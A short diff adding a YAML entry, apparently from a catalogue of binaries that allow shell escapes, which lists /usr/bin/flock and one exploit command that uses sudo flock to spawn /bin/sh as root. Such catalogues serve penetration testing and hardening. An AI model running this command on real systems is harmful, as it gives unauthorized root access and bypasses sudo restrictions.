@@ -1,0 +1,4 @@
+name: flock
+binary_path: /usr/bin/flock
+exploit_cmds:
+- sudo /usr/bin/flock -u / /bin/sh
